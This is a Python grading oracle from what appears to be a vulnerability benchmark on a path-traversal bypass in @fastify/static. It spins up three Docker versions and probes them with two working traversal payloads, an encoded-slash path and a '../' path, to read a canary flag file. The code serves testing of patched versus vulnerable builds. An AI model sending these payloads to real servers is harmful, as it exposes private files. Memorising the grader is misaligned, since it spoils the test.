#!/usr/bin/env python3
"""Flag differential oracle for fastify-static-cve-2026-15074.

Chain: CVE-2026-6414 (encoded %2F traversal, fixed 9.1.1)
     -> CVE-2026-15074 (non-leading '..' bypass, fixed 10.1.1).

V0 = @fastify/static 9.1.0  (both vulnerable)
V1 = @fastify/static 10.1.0 (6414 fixed, .. bypass works)  <- the target
V2 = @fastify/static 10.1.1 (15074 fixed)

Usage: PCB_FLAG=<token> python3 oracle.py --run-gate
"""
from __future__ import annotations

import argparse
import json
import os
import subprocess
import sys
import time
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parents[2] / "benchmark"))
from flag_oracle import FlagOracle, new_flag, validate_case_strict  # noqa: E402

sys.path.insert(0, str(HERE))
from original_poc import candidate as original_candidate  # noqa: E402

FLAG = os.environ.get("PCB_FLAG") or new_flag()

BASE = {
    "v0": "http://127.0.0.1:55100",
    "v1": "http://127.0.0.1:55101",
    "v2": "http://127.0.0.1:55102",
}


def run_probe(candidate, *, version="v1"):
    """Send one GET to BASE[version] with the candidate's path."""
    base = BASE[version]
    path = candidate["path"] if isinstance(candidate, dict) else str(candidate)
    import urllib.request
    req = urllib.request.Request(base + path, method="GET")
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            body = r.read().decode("utf-8", "replace")
            return {"version": version, "path": path, "status": r.status, "body": body}
    except Exception as e:
        return {"version": version, "path": path, "status": getattr(e, "code", None), "body": ""}


def original_poc(*, version="v1"):
    return run_probe({"_b": 1, "path": "/static/secret%2Fcanary.txt"}, version=version)


def bypass_poc(*, version="v1"):
    return run_probe({"_b": 1, "path": "/static/foo/../secret/canary.txt"}, version=version)


def mechanism_scope(candidate) -> bool:
    path = candidate.get("path", "") if isinstance(candidate, dict) else str(candidate)
    return "canary.txt" in path


def build_oracle() -> FlagOracle:
    o = FlagOracle(FLAG, run_probe, mechanism_scope)
    o.prime_seed(original_poc)
    return o


def gate() -> dict:
    return validate_case_strict(
        flag=FLAG,
        original_on_v0=original_poc(version="v0"),
        original_on_v1=original_poc(version="v1"),
        bypass_on_v1=bypass_poc(version="v1"),
        bypass_on_v2=bypass_poc(version="v2"),
    )


def _compose(*args, env=None):
    return subprocess.run(
        ["docker", "compose", *args], cwd=str(HERE), text=True,
        capture_output=True, check=False,
        env={**os.environ, **(env or {})},
    )


def _wait_canary(version: str, token: str, tries: int = 40) -> bool:
    """Poll until the .. bypass returns the canary (env ready)."""
    for _ in range(tries):
        if token in bypass_poc(version=version)["body"]:
            return True
        time.sleep(2)
    return False


def _profile_flags(profiles):
    flags = []
    for p in profiles:
        flags += ["--profile", p]
    return flags


def run_gate(profiles=("v0", "v1", "v2"), keep_up=False) -> dict:
    global FLAG
    FLAG = new_flag()
    env = {"PCB_FLAG": FLAG}
    all_profiles = _profile_flags(("v0", "v1", "v2"))
    _compose(*all_profiles, "down", "-v", env=env)
    r = _compose(*all_profiles, "build", "--pull", env=env)
    if r.returncode != 0:
        return {"error": "build failed", "stderr": r.stderr[-2000:], "stdout": r.stdout[-2000:]}
    r = _compose(*_profile_flags(profiles), "up", "-d", env=env)
    if r.returncode != 0:
        return {"error": "compose up failed", "stderr": r.stderr[-2000:], "stdout": r.stdout[-2000:]}
    ready = {v: _wait_canary(v, FLAG) for v in profiles}
    result = gate()
    result["_env_ready"] = ready
    result["_flag"] = FLAG
    if not keep_up:
        _compose(*all_profiles, "down", "-v", env=env)
    return result


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--gate", action="store_true")
    ap.add_argument("--run-gate", action="store_true")
    ap.add_argument("--keep-up", action="store_true")
    a = ap.parse_args()
    if a.run_gate:
        print(json.dumps(run_gate(keep_up=a.keep_up), indent=2))
    else:
        print(json.dumps(gate(), indent=2))
